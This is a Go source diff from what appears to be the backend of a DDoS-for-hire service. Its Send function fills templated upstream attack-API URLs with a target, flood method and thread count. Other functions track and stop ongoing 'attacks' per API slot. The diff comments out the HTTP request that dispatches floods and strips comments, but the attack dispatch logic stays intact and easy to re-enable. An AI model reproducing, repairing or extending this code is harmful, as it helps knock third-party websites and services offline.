@@ -5,7 +5,7 @@ import (
 	"api/core/models/floods"
 	"fmt"
 	"math"
-	"net/http"
+	//"net/http"
 	"strings"
 	"time"
 	"os"
@@ -42,9 +42,7 @@ func trackAttack(api *Api, attack *floods.Attack) {
 		attack: attack,
 	}
 	duration := time.Duration(attack.Duration) * time.Second
-	// Wait for the attack duration to finish
 	<-time.After(duration)
-	// Decrement the running count once the attack duration is done
 	api.running--
 	delete(ongoingAttacks, attack)
 	logger.Printf("Attack on API %s finished.\n", api.Name)
@@ -85,32 +83,30 @@ func Send(a *floods.Attack) error {
 		"$threads", fmt.Sprint(a.Threads),
 	)
 	for _, api := range Apis {
-		c := http.DefaultClient
+		//c := http.DefaultClient
 		method, ok := api.Methods[a.Method.Sname]
 		if !ok {
-			return fmt.Errorf("Skipping APIs trying servers...")
+			return fmt.Errorf("skipping APIs trying servers...")
 		}
 		url := terms.Replace(api.URL)
 		url = strings.ReplaceAll(url, "$method", method)
 		fmt.Println(url, a.Method.Sname)
-		resp, err := c.Get(url)
-		if err != nil {
-			return fmt.Errorf("error sending attack via API %s: %v", api.Name, err)
-		}
-		if resp.StatusCode == 200 {
+		//resp, err := c.Get(url)
+		//if err != nil {
+		//	return fmt.Errorf("error sending attack via API %s: %v", api.Name, err)
+		//}
+		/*if resp.StatusCode == 200 {
 			logger.Println("successfully sent attack using " + api.Name)
 			api.running++
-			// Start tracking the ongoing attack
 			go trackAttack(api, a)
 			continue
 		} else {
 			return fmt.Errorf("error occurred while sending attack using %s: StatusCode %d", api.Name, resp.StatusCode)
 		}
+		*/
 	}
 	return nil
 }
-
-// Load returns the load percentage for the API
 func (api *Api) Load() float64 {
 	logger.Println(api.Name, api.running, api.Slots, fmt.Sprintf("%.2f", (float64(api.running)/float64(api.Slots))*100))
 	return toFixed(((float64(api.running) / float64(api.Slots)) * 100), 2)
@@ -119,12 +115,9 @@ func (s *Api) Running() int {
 	return s.running
 }
 
-// round rounds a float64 number to the nearest integer
 func round(num float64) int {
 	return int(num + math.Copysign(0.5, num))
 }
-
-// toFixed formats a float64 number to the specified precision
 func toFixed(num float64, precision int) float64 {
 	output := math.Pow(10, float64(precision))
 	return float64(round(num*output)) / output
@@ -135,11 +128,8 @@ func Stop(target string) {
 	for _, ongoing := range ongoingAttacks {
 		api := ongoing.api
 		attack := ongoing.attack
-		// Check if the target matches the URL of the API
 		if strings.Contains(api.URL, target) {
-			// Decrement the running count for the API
 			api.running--
-			// Remove the attack from ongoing attacks map
 			delete(ongoingAttacks, attack)
 			logger.Printf("Stopped ongoing attack on API: %s\n", api.Name)
 		}
